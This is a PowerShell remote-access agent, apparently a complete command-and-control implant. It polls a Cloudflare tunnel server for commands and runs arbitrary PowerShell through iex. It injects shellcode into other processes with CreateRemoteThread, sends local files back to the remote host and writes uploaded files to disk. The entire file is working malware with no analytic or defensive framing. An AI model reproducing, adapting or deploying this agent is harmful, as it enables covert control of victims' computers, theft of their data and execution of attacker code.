# Enhanced PowerShell C2 Agent - FastAPI Version
# Connects to main.py BITS C2 integration on port 8000
# Uses HTTP + HMAC-SHA256 authentication

 $ServerUrl = "https://attention-launches-kind-commonly.trycloudflare.com/bits"
$AgentId = $env:COMPUTERNAME + "_" + $env:USERNAME
$SecretKey = "c2-agent-k3y-2024-s3cr3t"

# Function to generate HMAC-SHA256 signature
function Get-AuthHeaders {
    $timestamp = [int][double]::Parse((Get-Date -UFormat %s))
    $message = "$AgentId$timestamp"
    
    # HMAC-SHA256
    $hmac = New-Object System.Security.Cryptography.HMACSHA256
    $hmac.Key = [System.Text.Encoding]::UTF8.GetBytes($SecretKey)
    $hash = $hmac.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($message))
    $signature = [BitConverter]::ToString($hash).Replace("-", "").ToLower()
    
    return @{
        "X-Agent-ID" = $AgentId
        "X-Timestamp" = $timestamp.ToString()
        "X-Signature" = $signature
    }
}

# Injection functions
function Inject-Shellcode {
    param([byte[]]$Shellcode, [int]$ProcessId)
    
    try {
        # Win32 API definitions
        $Kernel32 = @"
using System;
using System.Runtime.InteropServices;
public class Kernel32 {
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    
    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@
        
        Add-Type -TypeDefinition $Kernel32
        
        # Process access flags
        $PROCESS_ALL_ACCESS = 0x1F0FFF
        
        # Memory allocation flags
        $MEM_COMMIT = 0x1000
        $MEM_RESERVE = 0x2000
        $PAGE_EXECUTE_READWRITE = 0x40
        
        # Open process
        $hProcess = [Kernel32]::OpenProcess($PROCESS_ALL_ACCESS, $false, $ProcessId)
        if ($hProcess -eq [IntPtr]::Zero) {
            return "Failed to open process $ProcessId"
        }
        
        # Allocate memory
        $remoteAddr = [Kernel32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $Shellcode.Length, ($MEM_COMMIT -bor $MEM_RESERVE), $PAGE_EXECUTE_READWRITE)
        if ($remoteAddr -eq [IntPtr]::Zero) {
            [Kernel32]::CloseHandle($hProcess)
            return "Failed to allocate memory in process $ProcessId"
        }
        
        # Write shellcode
        $bytesWritten = 0
        $writeResult = [Kernel32]::WriteProcessMemory($hProcess, $remoteAddr, $Shellcode, $Shellcode.Length, [ref]$bytesWritten)
        if (-not $writeResult) {
            [Kernel32]::CloseHandle($hProcess)
            return "Failed to write shellcode to process $ProcessId"
        }
        
        # Create remote thread
        $threadHandle = [Kernel32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $remoteAddr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
        if ($threadHandle -eq [IntPtr]::Zero) {
            [Kernel32]::CloseHandle($hProcess)
            return "Failed to create remote thread in process $ProcessId"
        }
        
        [Kernel32]::CloseHandle($threadHandle)
        [Kernel32]::CloseHandle($hProcess)
        
        return "Successfully injected shellcode into process $ProcessId"
    }
    catch {
        return "Injection error: $($_.Exception.Message)"
    }
}

function Get-ProcessList {
    try {
        $procs = Get-Process | Select-Object Id, Name, CPU, WS | Sort-Object -Property WS -Descending
        $output = "PID`tNAME`t`t`t`tCPU`tMEM`n"
        $output += "=" * 70 + "`n"
        foreach ($p in $procs) {
            $ws = [math]::Round($p.WS / 1MB, 2)
            $cpu = if ($p.CPU) { [math]::Round($p.CPU, 2) } else { "0" }
            $name = $p.Name.PadRight(24).Substring(0,24)
            $output += "$($p.Id)`t$name`t$cpu`t${ws}MB`n"
        }
        return $output
    }
    catch {
        return "Error getting process list: $($_.Exception.Message)"
    }
}

# Main loop - auto-registers on first command poll
Write-Host "[*] Agent starting: $AgentId"
while ($true) {
    try {
        # Get fresh auth headers for each request (timestamp changes)
        $Headers = Get-AuthHeaders
        
        # Get command (auto-registers if new agent)
        $response = Invoke-RestMethod -Uri "$ServerUrl/cmd/$AgentId" -Method Get -Headers $Headers -UseBasicParsing
        $command = $response.command
        
        if ($command -and $command -ne "") {
            Write-Host "[>] Command: $command"
            
            # Handle special commands
            if ($command -eq "ps") {
                $result = Get-ProcessList
            }
            elseif ($command -match "^inject\s+(\d+)\s+(.+)$") {
                $pid = [int]$Matches[1]
                $b64Shellcode = $Matches[2]
                
                try {
                    $shellcode = [Convert]::FromBase64String($b64Shellcode)
                    $result = Inject-Shellcode -Shellcode $shellcode -ProcessId $pid
                }
                catch {
                    $result = "Failed to decode shellcode: $($_.Exception.Message)"
                }
            }
            elseif ($command -match "^download\s+(.+)$") {
                $filePath = $Matches[1]
                try {
                    if (Test-Path $filePath) {
                        $content = [System.IO.File]::ReadAllBytes($filePath)
                        $b64 = [Convert]::ToBase64String($content)
                        $result = "FILE_DOWNLOAD:$b64"
                    } else {
                        $result = "File not found: $filePath"
                    }
                }
                catch {
                    $result = "Download error: $($_.Exception.Message)"
                }
            }
            elseif ($command -match "^upload\s+(.+?)\s+(.+)$") {
                $filePath = $Matches[1]
                $b64Content = $Matches[2]
                try {
                    $bytes = [Convert]::FromBase64String($b64Content)
                    [System.IO.File]::WriteAllBytes($filePath, $bytes)
                    $result = "File uploaded: $filePath"
                }
                catch {
                    $result = "Upload error: $($_.Exception.Message)"
                }
            }
            else {
                # Execute command
                try {
                    $result = iex $command 2>&1 | Out-String
                }
                catch {
                    $result = "Error: $($_.Exception.Message)"
                }
            }
            
            # Send result - get fresh headers again
            $Headers = Get-AuthHeaders
            $body = @{ result = $result } | ConvertTo-Json
            Invoke-RestMethod -Uri "$ServerUrl/result/$AgentId" -Method Post -Body $body -ContentType "application/json" -Headers $Headers -UseBasicParsing | Out-Null
            Write-Host "[<] Result sent: $($result.Length) bytes"
        }
    }
    catch {
        Write-Host "[-] ERROR: $($_.Exception.Message)"
    }
    
    Start-Sleep -Seconds 3
}
